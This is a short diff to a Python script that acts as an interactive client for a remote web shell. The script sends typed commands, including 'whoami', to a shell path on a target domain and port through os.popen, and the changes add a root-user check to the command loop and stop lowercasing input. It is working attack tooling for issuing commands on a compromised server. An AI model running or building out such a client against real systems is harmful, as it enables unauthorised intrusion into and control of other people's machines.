@@ -55,10 +55,18 @@ else:
         if dir == '' or user == '' or host == '':
             print("No response from target shell. please check the shell path!")
             exit()
+        user = os.popen(handler +" " + domain + ":" + port + shell_path + "whoami").read().split('\n')
+        user = user[0]
+        if user == "root":
+            env = "#"
         shell = (user + "@" + host + ":" )
         while(1):
+            user = os.popen(handler +" " + domain + ":" + port + shell_path + "whoami").read().split('\n')
+            user = user[0]
+            if user == "root":
+                env = "#"
             query = input(shell + dir + env)
-            query = query.replace(' ', '+').lower()
+            query = query.replace(' ', '+')
             if target_os == "linux" or target_os == "mac":
                 cd = query.startswith( 'cd')
                 if cd == True:
